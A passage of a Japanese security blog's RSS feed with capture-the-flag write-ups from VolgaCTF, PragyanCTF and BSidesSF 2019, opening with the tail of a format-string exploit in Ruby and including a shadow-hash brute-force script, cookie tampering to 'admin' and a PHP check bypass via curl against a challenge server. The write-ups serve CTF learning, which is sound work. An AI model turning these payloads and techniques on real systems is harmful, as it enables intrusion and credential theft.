z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;llow&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;c%11$hnAAAABBBBBBB&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x2a\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#800&#34;&gt;STDIN&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gets
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4892c%11$hnAAAABBB%17$p&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>VolgaCTF 2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/volga2019/</link>
      <pubDate>Wed, 03 Apr 2019 08:07:43 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/volga2019/</guid>
      <description>

&lt;h2 id=&#34;shadow-cat&#34;&gt;Shadow cat&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;と&lt;code&gt;encrypted.txt&lt;/code&gt;が渡される&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;には、1文字のユーザ名とその暗号化されたパスワードなどが乗っており、&lt;code&gt;encrypted.txt&lt;/code&gt;にはその1文字で構成される文字列が含まれており、単一替え字暗号だとわかる&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;のパスワードを総当たりで解き、得れた替え字表を使って置換するコードを書いて実行したらFLAG&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;unix_crypt&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# gem install unix-crypt&lt;/span&gt;
org &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[]&lt;/span&gt;
ans &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[]&lt;/span&gt;
lines &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./shadow.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
lines&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;line&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
  org &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
  enc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
  salt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;$&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
  
  &lt;span style=&#34;color:#666&#34;&gt;0x1f&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;upto(&lt;span style=&#34;color:#666&#34;&gt;0x7e&lt;/span&gt;) &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
    hashpass &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;UnixCrypt&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;SHA512&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;build(i&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chr, salt)
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; hashpass &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; enc
      ans &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; i&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chr
      &lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Passed&amp;#34;&lt;/span&gt;
      &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
  &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;

encrypted &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./encrypted.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chomp
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;VolgaCTF{&lt;/span&gt;&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;#{&lt;/span&gt;encrypted&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;tr(org&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;), ans&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;))&lt;span style=&#34;color:#b68;font-weight:bold&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;}&amp;#34;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;VolgaCTF{pass_hash_cracking_hashcat_always_lurks_in_the_shadows}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>PragyanCTF 2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/pragyan2019/</link>
      <pubDate>Sun, 10 Mar 2019 22:48:37 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/pragyan2019/</guid>
      <description>

&lt;h2 id=&#34;welcome&#34;&gt;Welcome&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;JPEGが渡されるが、binwalkをかけると中にzipがあるので取り出す&lt;/li&gt;
&lt;li&gt;取り出したzipを展開すると壊れたbmpとパスワード付きのzipが展開される&lt;/li&gt;
&lt;li&gt;bmpファイルの末尾にはbase64エンコードされたような文字列があるのでデコードするとzipのパスワード&lt;/li&gt;
&lt;li&gt;zipを展開するとpngファイルがでてくる&lt;/li&gt;
&lt;li&gt;stegosolveで適当にぽちぽちやるとFLAG&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{st3gs0lv3_1s_u53ful}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;cookie-monster&#34;&gt;Cookie Monster&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Cookieにflagというフィールドがあり、MD5が設定されている&lt;/li&gt;
&lt;li&gt;どこかのMD5クラックサイトで検索すると&lt;code&gt;pc&lt;/code&gt;がでてくる&lt;/li&gt;
&lt;li&gt;フラグフォーマットは、&lt;code&gt;pctf{&lt;/code&gt;なのでひたすらこのCookieのMD5の元を考えれば良いとわかる&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{c0oki3s_@re_yUm_bUt_tHEy_@ls0_r3vEaL_@_l0t}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;feed-me&#34;&gt;Feed_me&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;バイナリを読むと、渡された乱数3つがチェック用の値になっている&lt;/li&gt;
&lt;li&gt;入力文字列を10byteずつ分割してatoiに流し込んでいて、以下の式が成り立てばおｋなので、あとは算数
&lt;code&gt;
x + y = a1
y + z = a2
x + z = a3
&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;自分が解いたときのケース
&lt;code&gt;
Can you cook my favourite food using these ingredients :)
-10026 ; -8250 ; -12490 ;
-000007133-000002893-000005357
That&#39;s yummy.... Here is your gift:
pctf{p1zz4_t0pp3d_w1th_p1n34ppl3_s4uc3}
&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;game-of-faces&#34;&gt;Game of Faces&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;ページにアクセスすると3色のよくわからん正方形があるが、ソースを見るとファイルアップロードが見える&lt;/li&gt;
&lt;li&gt;適当にファイルをアップロードするとh1タグでbase64エンコードされた文字列が帰ってくるのでデコードするとファイル名がわかる&lt;/li&gt;
&lt;li&gt;ファイル名で直接アクセスするとフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{You_L00K_Wi3Rd_IN_H3R3}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;easy-rsa&#34;&gt;Easy RSA&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;e, c, nのパラメータが渡されるが、eが著しく大きいので、Wiener&amp;rsquo;s Attackだとわかる&lt;/li&gt;
&lt;li&gt;コード書いて、秘密鍵dを計算すると&lt;code&gt;12978409760901509356642421072925801006324287746872153539187221529835976408177&lt;/code&gt;だとわかる&lt;/li&gt;
&lt;li&gt;あとは普通にRSAを解読したら、出てきた数値を16進数表記にして1byteずつasciiにすればフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{Sup3r_st4nd4rd_W31n3r_4tt4ck}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;late-pr&#34;&gt;Late PR&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;課題を提出しようとしてたけどパソコンがクラッシュしたという問題文とともにイメージファイルが渡される&lt;/li&gt;
&lt;li&gt;vol.pyでプロセスを見るとchrome.exeがexitしていることがわかり、GoogleChromeCrashHandler.exeというプロセスの存在に気づくので、当該プロセスのメモリダンプを見てみるとフラグ

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;vol.py -f *.raw --profile Win7SP1x86_23418 pslist&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;vol.py -f *.raw --profile Win7SP1x86_23418 memdump --dump-dir .&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;strings 468.dmp | grep pctf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{Late_submissions_can_be_good}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;mandatory-php&#34;&gt;Mandatory PHP&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;以下のPHPのコードが渡される&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#bc7a00&#34;&gt;&amp;lt;?php&lt;/span&gt; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;flag.php&amp;#39;&lt;/span&gt;; 
highlight_file(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;index.php&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val1&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val2&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val3&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;val4&amp;#34;&lt;/span&gt;]; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(preg_match(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;/[^A-Za-z]/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;)) 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;oh my gawd...&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;hash(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;sha256&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;); 
&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;(log10(&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;**&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0.5&lt;/span&gt;)))&lt;span style=&#34;color:#666&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$a&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$c&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;$d&lt;/span&gt;) 
&lt;span style=&#34;color:#19177c&#34;&gt;$s1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Bye...&amp;#34;&lt;/span&gt;); 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$s1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;) 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$flag1&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;;&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;&amp;lt;=&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;10&lt;/span&gt;;&lt;span style=&#34;color:#19177c&#34;&gt;$i&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;++&lt;/span&gt;){ 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt;urldecode(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;)) 
        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;duck&amp;#39;&lt;/span&gt;); 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
        &lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;urldecode(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;); 
}     
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$b&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;WoAHh!&amp;#34;&lt;/span&gt;) 
&lt;span style=&#34;color:#19177c&#34;&gt;$s2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;else&lt;/span&gt; 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;oops..&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#19177c&#34;&gt;$s2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;===&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;) 
    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;$flag2&lt;/span&gt;; 
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;end...&amp;#39;&lt;/span&gt;); 
&lt;span style=&#34;color:#bc7a00&#34;&gt;?&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;val1&lt;/code&gt;が&lt;code&gt;INF&lt;/code&gt;になるので、&lt;code&gt;val3&lt;/code&gt;と&lt;code&gt;val4&lt;/code&gt;でINFになるようにデカイ数を渡して、&lt;code&gt;val2&lt;/code&gt;は10回urldecodeして&lt;code&gt;WoAHh!&lt;/code&gt;になるようにパラメータを渡せば良い&lt;/li&gt;
&lt;li&gt;&lt;code&gt;curl &#39;http://159.89.166.12:14000///index.php?ffval1=0&amp;amp;val2=WoAHh%2525252525252525252521&amp;amp;val3=101&amp;amp;val4=大きい値&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{b3_c4r3fu1_w1th_pHp_f31145}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;終了後に解いた問題&#34;&gt;終了後に解いた問題&lt;/h2&gt;

&lt;h3 id=&#34;magic-pngs&#34;&gt;Magic PNGs&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;パスワード付きzipとpngファイルが渡されるが、&lt;code&gt;file&lt;/code&gt;コマンドを叩くと&lt;code&gt;data&lt;/code&gt;都市てか表示されないためヘッダーなどが間違っていると推測できる&lt;/li&gt;
&lt;li&gt;案の定Magic numberが間違っているので修正するが、それでも開かない&lt;/li&gt;
&lt;li&gt;PNGは通常IDATチャンクがあるはずだが、そのキーワードが&lt;code&gt;idat&lt;/code&gt;と小文字になっていたのでこれを修正すると開けて、&lt;code&gt;h4CK3RM4n&lt;/code&gt;が読み取れる&lt;/li&gt;
&lt;li&gt;ヒントから、この値をmd5してパスワードzipを展開するとフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{y0u_s33_m33_n0w!}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ファイルヘッダーとかが違うところに気づいていなかった&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;exorcism&#34;&gt;EXORcism&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;大量の1と0があるファイルを渡される&lt;/li&gt;
&lt;li&gt;100x100の正方形に整形して、1をスペース、0は黒として描画するとQRコードになる&lt;/li&gt;
&lt;li&gt;QRコードを読み取ると、&lt;code&gt;160f15011d1b095339595138535f135613595e1a&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;タイトルがXORなので、この文字列となにかをxorする必要があると推測できる&lt;/li&gt;
&lt;li&gt;フラグフォーマットの&lt;code&gt;pctf{&lt;/code&gt;になるようにxorする値を計算すると&lt;code&gt;flagf&lt;/code&gt;になるので、&lt;code&gt;flag&lt;/code&gt;を繰り返してxorすれば良いとわかるので、それで計算するとフラグ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pctf{wh4_50_53r1u5?}&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;そもそもQRコードになるなんて想像ができなかった&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;save-earth&#34;&gt;Save Earth&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;USBパケットのデータが渡されて入力した値を求めさせる&lt;/li&gt;
&lt;li&gt;データ内にasciiがないので、間隔つまりモールス信号だと推測する&lt;/li&gt;
&lt;li&gt;USBパケットの末尾のデータ部から4をスペース、1と2をそれぞれモールス信号にするとフラグが得られる&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CTFS4V3&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>BesidesCTF 2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/bsidessf2019/</link>
      <pubDate>Sun, 10 Mar 2019 22:43:52 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/bsidessf2019/</guid>
      <description>

&lt;h2 id=&#34;blink&#34;&gt;blink&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;apkが渡されるのでunzipして、&lt;code&gt;classes.dex&lt;/code&gt;をdex2jarでjarファイルに変換&lt;/li&gt;
&lt;li&gt;jarファイルをunzipして、classファイルをjadで一括逆コンパイル&lt;/li&gt;
&lt;li&gt;適当にファイルを眺めていると&lt;code&gt;/com/example/blink/r2d2.jad&lt;/code&gt;にbase64でエンコードされた文字列があるのでデコード&lt;/li&gt;
&lt;li&gt;&lt;code&gt;CTF{PUCKMAN}&lt;/code&gt;と書かれた画像が出てくる&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;zippy&#34;&gt;zippy&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;pcapngが渡されるのでFollo TCP Streamをすると&lt;code&gt;supercomplexpassword&lt;/code&gt;がzipのパスワードだとわかる&lt;/li&gt;
&lt;li&gt;パケットからzipファイルを通信してるパケットを見つけて抽出&lt;/li&gt;
&lt;li&gt;パスワードを使ってunzipすると中のflag.txtに&lt;code&gt;CTF{this_flag_is_your_flag}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;futurella&#34;&gt;futurella&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;HTMLのソースを見ると&lt;code&gt;CTF{bring_it_back}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;kookie&#34;&gt;kookie&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cookie/monster&lt;/code&gt;でログインできるのでログインする&lt;/li&gt;
&lt;li&gt;その際のCookieを見ると、&lt;code&gt;cookie&lt;/code&gt;になっているので、これを&lt;code&gt;admin&lt;/code&gt;に変更&lt;/li&gt;
&lt;li&gt;その後reloadすると&lt;code&gt;CTF{kookie_cookies}&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
  </channel>
</rss>